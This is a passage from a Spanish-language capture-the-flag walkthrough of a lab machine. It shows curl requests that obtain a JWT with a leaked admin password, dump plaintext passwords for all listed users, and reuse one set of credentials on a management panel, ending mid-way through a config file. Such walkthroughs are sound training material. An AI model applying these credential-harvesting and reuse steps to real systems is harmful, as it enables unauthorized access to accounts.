&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;success&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;message&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Auth token is not supplied&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Realizamos una busqueda de los mensajes que nos mostraba la pagina web al visitar cada uno de los &amp;ldquo;directorios&amp;rdquo;, encontramos una pagina que habal sobre tokens.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;INFO:&lt;/strong&gt; &lt;a href=&#34;https://medium.com/dev-bits/a-guide-for-adding-jwt-token-based-authentication-to-your-single-page-nodejs-applications-c403f7cf04f4&#34;&gt;&lt;strong&gt;Token Authentication - Nodejs&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Para obtener nuestro token utilizamos el siguiente request con curl, añadimos la contraseña que encontramos en la pagina config.php, usamos el usuario admin para el request.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl --header &lt;span class=&#34;s2&#34;&gt;&amp;#34;Content-Type: application/json&amp;#34;&lt;/span&gt; --request POST --data &lt;span class=&#34;s1&#34;&gt;&amp;#39;{&amp;#34;password&amp;#34;:&amp;#34;Zk6heYCyv6ZE9Xcg&amp;#34;, &amp;#34;username&amp;#34;:&amp;#34;admin&amp;#34;}&amp;#39;&lt;/span&gt;   http://10.10.10.137:3000/login
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El resultado del request, obtuvimos nuestro token de autenticacion.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;success&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;true&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;message&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Authentication successful!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;token&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos el token de autenticacion para poder acceder a los usuarios dentro del &amp;ldquo;directorio&amp;rdquo; /users.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl -X GET &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4&amp;#39;&lt;/span&gt; &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;  http://10.10.10.137:3000/users
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;El resultado del request, obtuvimos algunos nombres con su respectivo ID, Nombre y Rol que tiene cada uno de ellos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;[{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;ID&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;Role&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Superuser&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;ID&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Derry&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;Role&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Web Admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;ID&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Yuri&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;Role&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Beta Tester&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;},{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;ID&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Dory&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;Role&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Supporter&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Users:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;nt&#34;&gt;&amp;#34;ID&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
      &lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
      &lt;span class=&#34;nt&#34;&gt;&amp;#34;Role&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Superuser&amp;#34;&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;nt&#34;&gt;&amp;#34;ID&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
      &lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Derry&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
      &lt;span class=&#34;nt&#34;&gt;&amp;#34;Role&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Web Admin&amp;#34;&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;nt&#34;&gt;&amp;#34;ID&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
      &lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Yuri&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
      &lt;span class=&#34;nt&#34;&gt;&amp;#34;Role&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Beta Tester&amp;#34;&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
      &lt;span class=&#34;nt&#34;&gt;&amp;#34;ID&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
      &lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Dory&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
      &lt;span class=&#34;nt&#34;&gt;&amp;#34;Role&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Supporter&amp;#34;&lt;/span&gt;
   &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Visitamos de igual forma la siguiente ruta con el token /users/Admin y obtuvimos la contraseña del usuario admin.&lt;/p&gt;
&lt;p&gt;Request:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;curl -X GET -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4&amp;#39;&lt;/span&gt; http://10.10.10.137:3000/users/admin/
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Respuesta:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;WX5b7)&amp;gt;/rp$U)FW&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos el mismo request cambiamos /admin/ por la lista de usuarios que encontramos para obtener las contraseñas de los mismos.&lt;/p&gt;
&lt;p&gt;User-Pass:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;WX5b7)&amp;gt;/rp$U)FW&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Derry&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;rZ86wwLvx7jUxtch&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Yuri&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;bet@tester87&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;name&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Dory&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;5y:!xa=ybfe)/QD&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos las Credenciales en los distintos paneles que encontramos, en el caso de las credenciales de Derry funcionaron en el panel de &lt;strong&gt;/management&lt;/strong&gt; en el puerto 80 y nos muestra:&lt;/p&gt;
&lt;h4 id=&#34;pagina-principal&#34;&gt;Pagina principal&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/luke/Screenshot_20190528_193405.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;config.json&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;users&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;root&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nt&#34;&gt;&amp;#34;configs&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.plugins.notepad.notepad.Notepad&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;bookmarks\&amp;#34;: [], \&amp;#34;root\&amp;#34;: \&amp;#34;/\&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
                &lt;span class=&#34;nt&#34;&gt;&amp;#34;ajenti.plugins.terminal.main.Terminals&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;{\&amp;#34;shell\&amp;#34;: \&amp;#34;sh -c $SHELL || sh\&amp;#34;}&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; 
